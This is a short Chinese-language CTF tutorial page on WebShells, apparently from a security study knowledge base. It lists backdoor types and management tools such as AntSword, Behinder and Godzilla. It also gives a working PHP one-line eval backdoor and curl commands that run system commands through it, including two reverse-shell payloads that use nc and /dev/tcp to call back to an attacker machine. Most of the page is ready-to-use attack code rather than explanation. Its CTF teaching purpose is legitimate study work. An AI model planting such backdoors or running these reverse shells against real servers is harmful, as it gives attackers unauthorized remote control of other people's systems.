## WebShell -- 工具配置

> WebShell 是获取目标服务器权限后上传的后门脚本，通过浏览器或工具远程执行命令。

### WebShell 的常见形式

| 类型 | 语言 | 特点 |
|------|------|------|
| 一句话木马 | PHP/ASP/JSP | 最小体积，通过 POST 参数执行命令 |
| 大马 | PHP/ASP | 完整文件管理器，带提权功能 |
| 内存 shell | Java/PHP | 无文件落地，仅存在内存中 |
| 冰蝎/哥斯拉 | Java/PHP | 加密通信，绕过 WAF |

### PHP 一句话木马

```php
<?php @eval($_POST['cmd']); ?>
```

```bash
# 用 curl 连接一句话木马
curl -X POST -d "cmd=system('id');" http://target.com/shell.php

# 获取完整 shell（反弹 shell）
curl -X POST -d "cmd=system('nc -e /bin/bash IP 4444');" http://target.com/shell.php
```

### 常见 WebShell 管理工具

| 工具 | 语言 | 特点 |
|------|------|------|
| 蚁剑（AntSword） | 多语言 | 开源、模块化、可自定义编码器 |
| 冰蝎（Behinder） | Java/ASP/PHP | 加密通讯，动态密钥 |
| 哥斯拉（Godzilla） | Java/PHP/ASP | 功能丰富，多载荷类型 |
| 中国菜刀（Cknife） | 多语言 | 经典工具，已逐渐被替代 |

### 终端直接操作（无工具依赖）

```bash
# 一句话木马 - 执行命令
curl -X POST "http://target.com/shell.php" -d "cmd=system('cat /flag');"

# 一句话木马 - 反弹 shell（攻击机 nc -lvp 4444）
curl -X POST "http://target.com/shell.php" \
 -d "cmd=system('bash -i >& /dev/tcp/攻击机IP/4444 0>&1');"

# 一句话木马 - 查看文件
curl -X POST "http://target.com/shell.php" \
 -d "cmd=system('ls -la /');"
```

### 关联教程

- [[../菜刀类工具/菜刀类工具|菜刀类工具配置]] -- 蚁剑/冰蝎等工具详细配置
- [[../远程连接/远程连接|远程连接]] -- SSH / nc 反弹 shell
- [[../../../../archstrike-web教学/06-文件包含与命令注入|06-文件包含与命令注入]] -- 上传 WebShell 的常见入口
- [[../../Web|Web 方向总览]] -- Web CTF 方向入口
